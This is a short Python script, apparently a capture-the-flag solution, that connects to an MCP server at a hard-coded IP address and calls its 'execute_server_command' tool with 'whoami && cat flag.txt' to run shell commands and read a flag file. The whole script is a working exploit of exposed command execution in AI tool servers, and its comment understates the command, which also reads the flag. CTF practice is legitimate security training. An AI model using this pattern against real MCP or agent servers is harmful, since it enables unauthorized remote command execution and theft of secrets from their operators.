import asyncio
from fastmcp import Client

SERVER_URL = "http://154.57.164.78:30227/mcp"

async def main():
    client = Client(SERVER_URL)
    async with client:
        # Call the tool and pass 'whoami' as the command argument
        result_object = await client.call_tool(
            "execute_server_command", 
            {"command": "whoami && cat flag.txt"}
        )
        
        # Extract and print the response text
        result_text = result_object.content[0].text
        print(f"*** Command Result:\n{result_text}")

if __name__ == "__main__":
    asyncio.run(main())